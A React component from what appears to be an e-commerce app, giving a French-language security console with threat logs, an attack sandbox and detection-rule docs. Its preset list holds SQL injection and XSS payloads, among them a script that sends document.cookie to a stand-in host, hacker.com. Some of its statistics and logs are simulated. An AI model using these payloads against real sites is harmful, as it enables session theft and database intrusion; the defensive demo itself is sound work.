import React, { useState, useEffect, useRef } from 'react';
import { 
  Shield, 
  AlertTriangle, 
  Terminal, 
  Trash2, 
  Play, 
  RefreshCw, 
  Activity, 
  Fingerprint, 
  BookOpen, 
  ShieldAlert, 
  ShieldCheck, 
  Flame, 
  Lock
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { toast } from 'sonner';
import { EladmaSecurity, BlockedThreat } from '../services/security';

interface SecurityConsoleProps {
  onClose?: () => void;
}

export const SecurityConsole: React.FC<SecurityConsoleProps> = ({ onClose }) => {
  const [threats, setThreats] = useState<BlockedThreat[]>([]);
  const [activeTab, setActiveTab] = useState<'console' | 'sandbox' | 'docs'>('console');
  
  // Sandbox test state
  const [sandboxField, setSandboxField] = useState('Numéro de Carte');
  const [sandboxInput, setSandboxInput] = useState('');
  const [sessionAuditsCount, setSessionAuditsCount] = useState(134); // Starting simulated count

  // Live system updates ticker
  const [systemLogs, setSystemLogs] = useState<string[]>([
    "System init... OK",
    "Port 3000 Secure Proxy active",
    "Eladma Security Shield 4.1 instantiated successfully",
    "Telemetry hook established",
    "Anti-CSRF token verification mode: PASSIVE",
    "GPS Geo-Fence validated (Kananga tri-point cluster)",
  ]);

  const terminalEndRef = useRef<HTMLDivElement>(null);

  // Subscribe to real-time threat telemetry
  useEffect(() => {
    const unsubscribe = EladmaSecurity.subscribeToThreats((updatedThreats) => {
      setThreats(updatedThreats);
    });
    return () => unsubscribe();
  }, []);

  // Update session audits count periodically to feel alive
  useEffect(() => {
    const interval = setInterval(() => {
      setSessionAuditsCount(prev => prev + Math.floor(Math.random() * 2) + 1);
      
      // Occasionally add general informational audits in terminal logs
      const informationalLogs = [
        `Audit: Validation de session utilisateur OK`,
        `Cryptographie: Vérification de l'intégrité du LocalStorage`,
        `Contrôle Réseau: Taux de requête IP normal (0.15 req/sec)`,
        `Module anti-tamper: Signature DOM valide`,
        `Vérification de coffre des points rewards : OK`
      ];
      const randomLog = informationalLogs[Math.floor(Math.random() * informationalLogs.length)];
      setSystemLogs(prev => [...prev.slice(-20), `[${new Date().toLocaleTimeString('fr-FR')}] ${randomLog}`]);
    }, 4500);

    return () => clearInterval(interval);
  }, []);

  // Scroll terminal logs to bottom
  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [systemLogs, threats]);

  // Predefined payloads for the user to simulate attacks easily!
  const samplePayloads = [
    {
      name: "Bypass d'Auth SQL (SQLi)",
      field: "E-mail du Client",
      value: "admin@eladma.com' OR '1'='1",
      type: "SQL_INJECTION",
      desc: "Force l'évaluation d'une condition SQL toujours vraie pour contourner la base de données."
    },
    {
      name: "Détournement de Carte (SQLi)",
      field: "Numéro de Carte",
      value: "4208 1234 5678 UNION SELECT @@version",
      type: "SQL_INJECTION",
      desc: "Tente d'injecter une commande UNION SELECT dans le champ sensible du numéro de carte bancaire."
    },
    {
      name: "Script Malveillant CVV (XSS)",
      field: "CVV de Carte",
      value: "999<script>alert('CVV_XSS')</script>",
      type: "XSS",
      desc: "Essaye d'exécuter une alerte JavaScript injectée directement via le champ de sécurité CVV de la carte."
    },
    {
      name: "Vol de Session (XSS)",
      field: "Destination de Livraison",
      value: "<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>",
      type: "XSS",
      desc: "Tente d'injecter du code JavaScript exécutable pour récolter les cookies de l'acheteur."
    },
    {
      name: "SVG Event Hijack (XSS)",
      field: "Nom Complet",
      value: "<svg/onload=alert('XSS_HACKED')>",
      type: "XSS",
      desc: "Utilise une balise graphique SVG et son événement onload pour forcer l'exécution de script."
    },
    {
      name: "Rafale Abusive (Card Testing)",
      field: "",
      value: "",
      type: "RATE_LIMIT",
      desc: "Simule un script automatisé de card-testing pilonnant le service d'achat de cartes."
    }
  ];

  const handleTestSandbox = () => {
    if (!sandboxInput.trim()) {
      toast.error("Veuillez saisir un texte d'entête à tester.");
      return;
    }

    setSessionAuditsCount(prev => prev + 1);
    setSystemLogs(prev => [...prev, `[${new Date().toLocaleTimeString('fr-FR')}] Analyse en cours de: "${sandboxInput}" sur le champ "${sandboxField}"`]);
    
    let isSafe = true;
    
    // Route via specific PaymentGuard module when analyzing payment-centric selector targets
    if (sandboxField === 'Numéro de Carte') {
      isSafe = EladmaSecurity.PaymentGuard.validatePaymentInputs(sandboxInput, '12/28', '123', 'John Doe');
    } else if (sandboxField === 'CVV de Carte') {
      isSafe = EladmaSecurity.PaymentGuard.validatePaymentInputs('4000 1234 5678 9010', '12/28', sandboxInput, 'John Doe');
    } else if (sandboxField === 'Expiration de Carte') {
      isSafe = EladmaSecurity.PaymentGuard.validatePaymentInputs('4000 1234 5678 9010', sandboxInput, '123', 'John Doe');
    } else {
      isSafe = EladmaSecurity.checkSuspiciousBehavior(sandboxInput, sandboxField);
    }
    
    if (isSafe) {
      toast.success("✅ Analyse terminée : Ce texte est sûr et ne contient pas d'attaques XSS/SQL Injection.");
      setSystemLogs(prev => [...prev.slice(-25), `[${new Date().toLocaleTimeString('fr-FR')}] Résultat de l'audit: CONFORME / SÛR`]);
    } else {
      setSystemLogs(prev => [...prev.slice(-25), `[${new Date().toLocaleTimeString('fr-FR')}] 🔴 MENACE DÉTECTÉE : TRANSACTION BLOQUÉE PAR ELADMA SECURE`]);
    }
  };

  const handleApplyPreset = (preset: typeof samplePayloads[0]) => {
    if (preset.type === 'RATE_LIMIT') {
      // Direct flooding simulation
      toast.info("Simulation d'inondation en cours...");
      for (let i = 0; i < 7; i++) {
        EladmaSecurity.checkRateLimit('simulated_api_flood_test', 5, 20000);
      }
      setSessionAuditsCount(p => p + 7);
      setSystemLogs(p => [...p, `[${new Date().toLocaleTimeString('fr-FR')}] Alerte : Fréquence de requête anormale sur simulated_api_flood_test`]);
    } else {
      setSandboxField(preset.field);
      setSandboxInput(preset.value);
      toast.success(`Preset "${preset.name}" injecté dans le simulateur !`);
    }
  };

  const threatCounts = threats.reduce((acc, t) => {
    acc[t.type] = (acc[t.type] || 0) + 1;
    return acc;
  }, { SQL_INJECTION: 0, XSS: 0, RATE_LIMIT: 0 } as Record<string, number>);

  return (
    <div className="bg-zinc-950 text-zinc-100 rounded-3xl overflow-hidden border border-zinc-800 shadow-2xl flex flex-col h-full max-h-[85vh] lg:max-h-[680px]">
      {/* Console Header */}
      <div className="px-6 py-5 bg-zinc-900 border-b border-zinc-800 flex items-center justify-between shrink-0">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center justify-center animate-pulse">
            <ShieldAlert className="w-5 h-5 text-red-500" />
          </div>
          <div>
            <h3 className="font-extrabold text-white text-base flex items-center gap-2 tracking-tight">
              Console de Sécurité Eladma <span className="text-[10px] font-black uppercase tracking-widest px-2 py-0.5 rounded-full bg-red-600 text-white">Shield Live</span>
            </h3>
            <p className="text-xs text-zinc-400">Télémétrie d'intrusion et tableau de bord anti-fraude en temps réel</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <span className="relative flex h-2 w-2">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
            <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
          </span>
          <span className="text-[10px] font-bold text-emerald-400 tracking-wider uppercase">Actif</span>
        </div>
      </div>

      {/* Stats Board */}
      <div className="grid grid-cols-2 md:grid-cols-4 border-b border-zinc-800 bg-zinc-950 shrink-0">
        <div className="p-4 border-r border-zinc-800 text-center">
          <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Sûreté du Terminal</p>
          <div className="flex items-center justify-center gap-1.5 mt-1">
            <ShieldCheck className="w-4 h-4 text-emerald-400" />
            <span className="text-lg font-black text-emerald-400">99.98%</span>
          </div>
        </div>
        <div className="p-4 border-r border-zinc-800 text-center">
          <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Requêtes Analysées</p>
          <span className="text-lg font-black text-zinc-300 mt-1 block">{sessionAuditsCount}</span>
        </div>
        <div className="p-4 border-r border-zinc-800 text-center bg-red-950/10">
          <p className="text-[10px] font-bold text-red-400/80 uppercase tracking-widest">SQLi / XSS Bloqués</p>
          <div className="flex items-center justify-center gap-1.5 mt-1">
            <Flame className="w-4 h-4 text-red-500" />
            <span className="text-lg font-black text-red-500">{threats.length}</span>
          </div>
        </div>
        <div className="p-4 text-center">
          <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Attaques par Minute</p>
          <span className="text-lg font-black text-zinc-300 mt-1 block">{threats.length > 0 ? (threats.length / 2).toFixed(1) : "0.0"}</span>
        </div>
      </div>

      {/* Tabs Navigation */}
      <div className="px-6 py-2 bg-zinc-900 border-b border-zinc-800 flex items-center justify-between shrink-0">
        <div className="flex gap-1">
          <button 
            onClick={() => setActiveTab('console')}
            className={`px-4 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 ${activeTab === 'console' ? 'bg-zinc-800 text-white shadow-inner border border-zinc-700' : 'text-zinc-400 hover:text-white'}`}
          >
            <Activity className="w-3.5 h-3.5" />
            Threat logs & Forensics
          </button>
          <button 
            onClick={() => setActiveTab('sandbox')}
            className={`px-4 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 ${activeTab === 'sandbox' ? 'bg-zinc-800 text-white shadow-inner border border-zinc-700' : 'text-zinc-400 hover:text-white'}`}
          >
            <Play className="w-3.5 h-3.5 text-orange-400" />
            Attaque Sandbox Simulator
          </button>
          <button 
            onClick={() => setActiveTab('docs')}
            className={`px-4 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 ${activeTab === 'docs' ? 'bg-zinc-800 text-white shadow-inner border border-zinc-700' : 'text-zinc-400 hover:text-white'}`}
          >
            <BookOpen className="w-3.5 h-3.5 text-blue-400" />
            Règles & Signatures
          </button>
        </div>
        {threats.length > 0 && (
          <button 
            onClick={() => {
              EladmaSecurity.clearThreatLogs();
              toast.success("Journal d'audits de sécurité réinitialisé.");
            }}
            className="p-1 px-2 hover:bg-red-500/15 duration-200 text-red-400/80 rounded-lg text-[10px] font-bold flex items-center gap-1.5"
            title="Effacer l'historique"
          >
            <Trash2 className="w-3.5 h-3.5" />
            Effacer
          </button>
        )}
      </div>

      {/* Console Content */}
      <div className="flex-1 overflow-y-auto p-6 min-h-0 bg-zinc-950/50">
        <AnimatePresence mode="wait">
          {activeTab === 'console' && (
            <motion.div 
              key="console-tab"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="space-y-6 h-full flex flex-col min-h-0"
            >
              {threats.length === 0 ? (
                <div className="flex-1 flex flex-col items-center justify-center text-center p-8 border border-dashed border-zinc-800 rounded-3xl bg-zinc-900/10 min-h-[220px]">
                  <div className="w-14 h-14 bg-emerald-500/10 text-emerald-500 rounded-full flex items-center justify-center mb-4">
                    <ShieldCheck className="w-6 h-6" />
                  </div>
                  <h4 className="font-extrabold text-white">Le périmètre est sécurisé</h4>
                  <p className="text-xs text-zinc-500 max-w-sm mt-1">
                    Aucune activité d'injection SQL ou de piratage XSS n'a été détectée durant cette session utilisateur.
                  </p>
                  <p className="text-[10px] font-bold text-orange-400 mt-4 bg-orange-500/10 rounded-full px-3 py-1 animate-pulse">
                    💡 Astuce : Allez dans l'onglet "Attaque Sandbox" pour tester l'agent d'intrusion en temps réel !
                  </p>
                </div>
              ) : (
                <div className="space-y-4 max-h-[300px] overflow-y-auto pr-1">
                  <div className="text-[10px] uppercase font-bold text-zinc-500 tracking-wider">Menaces Bloquées Récentes ({threats.length})</div>
                  {threats.map((threat) => (
                    <motion.div 
                      key={threat.id}
                      initial={{ scale: 0.95, opacity: 0 }}
                      animate={{ scale: 1, opacity: 1 }}
                      className="p-4 rounded-xl border border-red-500/20 bg-red-950/5 flex flex-col gap-2 relative overflow-hidden"
                    >
                      <div className="absolute right-0 top-0 bg-red-500 text-white text-[9px] font-black px-2.5 py-1 rounded-bl-lg tracking-wider uppercase">
                        🛡️ Bloqué
                      </div>
                      
                      <div className="flex items-start gap-2.5">
                        <AlertTriangle className="w-4 h-4 text-red-500 shrink-0 mt-0.5" />
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className="text-xs font-black text-white px-2 py-0.5 bg-red-500/10 border border-red-500/20 rounded">
                              {threat.type}
                            </span>
                            <span className="text-[10px] font-mono text-zinc-500">
                              Id: {threat.id}
                            </span>
                            <span className="text-[10px] font-mono text-zinc-500 ml-auto mr-12">
                              {new Date(threat.timestamp).toLocaleTimeString('fr-FR')}
                            </span>
                          </div>
                          
                          <p className="text-xs text-zinc-300 mt-2 font-bold flex items-center gap-1">
                            Champ : <code className="text-red-400 font-mono text-xs">{threat.fieldName}</code>
                          </p>
                          <p className="text-xs text-zinc-400 mt-1">{threat.description}</p>
                          
                          {/* Malicious script payload view */}
                          <div className="mt-3 bg-zinc-950 p-2.5 rounded-lg border border-red-500/10 font-mono text-xs text-red-400 break-all select-all">
                            <span className="text-[10px] font-bold text-zinc-600 block mb-1">Payload Intercepté :</span>
                            {threat.value}
                          </div>

                          {threat.pattern && (
                            <p className="text-[10px] font-mono text-zinc-500 mt-1.5">
                              Signature déclenchée : <code className="text-zinc-400 font-bold">{threat.pattern}</code>
                            </p>
                          )}
                        </div>
                      </div>
                    </motion.div>
                  ))}
                </div>
              )}

              {/* Scrolling forensic terminal */}
              <div className="flex-1 flex flex-col border border-zinc-800 rounded-2xl overflow-hidden min-h-[140px] bg-zinc-950">
                <div className="px-4 py-2 bg-zinc-900 border-b border-zinc-800 flex items-center gap-2 shrink-0">
                  <Terminal className="w-4 h-4 text-zinc-400" />
                  <span className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest font-mono">Journal d'Audit Système</span>
                </div>
                <div className="flex-1 p-4 overflow-y-auto font-mono text-[11px] text-zinc-500 space-y-1">
                  {systemLogs.map((log, index) => (
                    <div key={index} className="leading-relaxed hover:text-zinc-300 duration-100">
                      <span className="text-zinc-600 select-none mr-2">&gt;</span>
                      {log}
                    </div>
                  ))}
                  {threats.length > 0 && (
                    <div className="text-red-500/80 font-bold animate-pulse leading-relaxed">
                      <span className="text-red-600 select-none mr-2">🛡️ [ALERT]</span>
                      {threats.length} tentative(s) d'incursion suspecte(s) déviée(s). Eladma Guard en alerte maximale.
                    </div>
                  )}
                  <div ref={terminalEndRef} />
                </div>
              </div>
            </motion.div>
          )}

          {activeTab === 'sandbox' && (
            <motion.div 
              key="sandbox-tab"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="space-y-6"
            >
              {/* Sandbox Controls */}
              <div className="p-5 rounded-2xl border border-zinc-800 bg-zinc-900/40 space-y-4">
                <h4 className="font-bold text-sm text-white flex items-center gap-2">
                  <Fingerprint className="w-4 h-4 text-orange-400" />
                  Injecteur de Payload à des fins d'Audit de Sécurité
                </h4>
                <p className="text-xs text-zinc-400 leading-relaxed">
                  Saisissez un texte d'attaque suspect de type Injection SQL ou Scription XSS pour simuler le blocage et voir comment Eladma Guard le filtre instantanément.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="space-y-1">
                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-wider">Cible d'Entrée</label>
                    <select 
                      value={sandboxField}
                      onChange={(e) => setSandboxField(e.target.value)}
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-3 py-2.5 text-xs font-bold text-zinc-300 outline-none focus:ring-1 focus:ring-brand"
                    >
                      <option>Numéro de Carte</option>
                      <option>CVV de Carte</option>
                      <option>Expiration de Carte</option>
                      <option>Nom Complet</option>
                      <option>Destination de Livraison</option>
                      <option>E-mail du Client</option>
                      <option>ID Produit</option>
                    </select>
                  </div>
                  
                  <div className="md:col-span-2 space-y-1">
                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-wider">Payload à tester</label>
                    <input 
                      type="text"
                      value={sandboxInput}
                      onChange={(e) => setSandboxInput(e.target.value)}
                      placeholder="ex: ' OR 1=1 ou <script>...</script>"
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-2.5 text-xs text-white outline-none focus:ring-1 focus:ring-brand font-mono placeholder:text-zinc-600"
                    />
                  </div>
                </div>

                <div className="flex gap-3 justify-end pt-2">
                  <button 
                    onClick={() => {
                      setSandboxInput('');
                      toast.success("Champ de test vidé.");
                    }}
                    className="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 font-bold rounded-xl text-xs transition-colors text-zinc-300"
                  >
                    Effacer
                  </button>
                  <button 
                    onClick={handleTestSandbox}
                    className="px-5 py-2 bg-brand hover:bg-brand-dark text-white rounded-xl text-xs font-bold transition-all shadow-md flex items-center gap-1.5"
                  >
                    <Play className="w-3.5 h-3.5" />
                    Tester l'Injection
                  </button>
                </div>
              </div>

              {/* Sample Attack Presets */}
              <div className="space-y-3">
                <div className="text-[10px] uppercase font-bold text-zinc-500 tracking-wider">Sélectionnez une attaque de simulation pré-configurée</div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {samplePayloads.map((preset, index) => (
                    <button
                      key={index}
                      onClick={() => handleApplyPreset(preset)}
                      className="p-3 text-left rounded-xl border border-zinc-800/80 bg-zinc-900/20 hover:bg-zinc-800/40 hover:border-zinc-700 duration-200 group flex gap-3 h-full items-start"
                    >
                      <div className="w-7 h-7 rounded-lg bg-orange-500/10 text-orange-400 flex items-center justify-center shrink-0 mt-0.5 font-bold text-xs group-hover:scale-105 transition-transform">
                        {index + 1}
                      </div>
                      <div className="min-w-0">
                        <div className="flex items-center gap-2">
                          <p className="text-xs font-extrabold text-white group-hover:text-brand duration-200">{preset.name}</p>
                          <span className="text-[8px] px-1.5 py-0.2 bg-zinc-800 text-zinc-400 font-bold rounded uppercase">
                            {preset.type.replace('_', ' ')}
                          </span>
                        </div>
                        <p className="text-[10px] text-zinc-500 mt-1 leading-relaxed">{preset.desc}</p>
                        {preset.value && (
                          <code className="text-[9px] block text-orange-400 font-mono mt-1 border-t border-zinc-800/50 pt-1 overflow-hidden text-ellipsis whitespace-nowrap">
                            {preset.value}
                          </code>
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </div>
            </motion.div>
          )}

          {activeTab === 'docs' && (
            <motion.div 
              key="docs-tab"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="space-y-6"
            >
              <div className="p-5 rounded-2xl border border-zinc-800 bg-zinc-900/40 space-y-4">
                <h4 className="font-bold text-sm text-white flex items-center gap-2">
                  <Lock className="w-4 h-4 text-blue-400" />
                  Règles de Détection & Mécanismes de Filtrage
                </h4>
                <p className="text-xs text-zinc-400 leading-relaxed">
                  Le système de sécurité Eladma Shield utilise un algorithme d'analyse heuristique basé sur la reconnaissance de motifs (RegEx-based signature matching) pour intercepter les cyber-menaces au niveau du client avant même qu'elles n'atteignent les serveurs ou les APIs.
                </p>

                <div className="space-y-3">
                  <div className="border border-zinc-800 rounded-xl p-3 bg-zinc-950/50">
                    <h5 className="text-xs font-bold text-white mb-1 flex items-center gap-1.5">
                      <span className="w-2 h-2 rounded-full bg-red-500" /> Signature SQL Injection (SQLi)
                    </h5>
                    <p className="text-[11px] text-zinc-500 leading-relaxed">
                      Scanne les saisies de formulaires à la recherche de mots-clés d'échappement comme <code className="text-zinc-400 px-1 rounded font-mono">UNION SELECT</code>, <code className="text-zinc-400 px-1 rounded font-mono">DROP TABLE</code>, des marqueurs de commentaire de fin de chaîne SQL (<code className="text-zinc-400 px-1 rounded font-mono">;--</code>, <code className="text-zinc-400 px-1 rounded font-mono">--</code>) ou des clauses de tautologies bypass typiques (<code className="text-zinc-400 px-1 rounded font-mono">' OR '1'='1</code>).
                    </p>
                  </div>

                  <div className="border border-zinc-800 rounded-xl p-3 bg-zinc-950/50">
                    <h5 className="text-xs font-bold text-white mb-1 flex items-center gap-1.5">
                      <span className="w-2 h-2 rounded-full bg-orange-500" /> Signature Cross-Site Scripting (XSS)
                    </h5>
                    <p className="text-[11px] text-zinc-500 leading-relaxed">
                      Neutralise les tentatives d'exécution de code malveillant en identifiant et bloquant les structures de scripts directes (<code className="text-zinc-400 px-1 bg-zinc-900 rounded font-mono">&lt;script&gt;</code>), les protocoles d'URI (<code className="text-zinc-400 px-1 bg-zinc-900 rounded font-mono">javascript:</code>), ainsi que les détournements de gestionnaires d'événements HTML encapsulés d'images ou d'objets SVG (<code className="text-zinc-400 px-1 bg-zinc-900 rounded font-mono">onerror=</code>, <code className="text-zinc-400 px-1 bg-zinc-900 rounded font-mono">onload=</code>).
                    </p>
                  </div>

                  <div className="border border-zinc-800 rounded-xl p-3 bg-zinc-950/50">
                    <h5 className="text-xs font-bold text-white mb-1 flex items-center gap-1.5">
                      <span className="w-2 h-2 rounded-full bg-amber-500" /> Limitation adaptative du trafic (Rate Limiting)
                    </h5>
                    <p className="text-[11px] text-zinc-500 leading-relaxed">
                      Empêche le pilonnage automatisé des fonctions vitales (comme la commande d'achat ou le contact commercial) en enregistrant de courts jetons temporels localisés (Token Bucket). Si la fréquence grimpe au-delà des limites configurées de la console, elle bloque et logs l'action en cours.
                    </p>
                  </div>

                  <div className="border border-zinc-800 rounded-xl p-3 bg-zinc-950/50">
                    <h5 className="text-xs font-bold text-white mb-1 flex items-center gap-1.5">
                      <span className="w-2 h-2 rounded-full bg-emerald-500" /> Module PaymentGuard (Protection des Opérations de Paiement)
                    </h5>
                    <p className="text-[11px] text-zinc-500 leading-relaxed">
                      Assure la protection exclusive du formulaire de transaction. Valide la structure du numéro de carte, intercepte l'injection SQL/XSS dans la date d'expiration ou le code CVV, protège contre l'abus de card-testing (limitation à 3 tentatives toutes les 2 minutes) et inspecte la cohérence alphanumérique.
                    </p>
                  </div>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Close/Back details */}
      {onClose && (
        <div className="px-6 py-4 bg-zinc-900 border-t border-zinc-800 flex justify-end shrink-0">
          <button 
            onClick={onClose}
            className="px-5 py-2.5 bg-zinc-800 hover:bg-zinc-700 text-white font-bold rounded-xl text-xs transition-colors"
          >
            Fermer la console
          </button>
        </div>
      )}
    </div>
  );
};
